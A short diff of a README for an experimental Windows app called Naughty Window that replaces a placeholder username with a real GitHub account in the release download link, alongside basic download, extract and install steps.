@@ -11,7 +11,7 @@ Naughty Window is an experimental Windows application designed to create persist
 
 ## Installation 📥
 1. **Download the setup file:**
-[📎 NaughtyWindowSetup.zip](https://github.com/USERNAME/NaughtyWindow/releases/latest/download/NaughtyWindowSetup.zip)
+[📎 NaughtyWindowSetup.zip](https://github.com/yedi18/NaughtyWindow/releases/latest/download/NaughtyWindowSetup.zip)
 2. **Extract the ZIP file.**
 3. **Run the setup file:**
    - Follow the installation wizard.
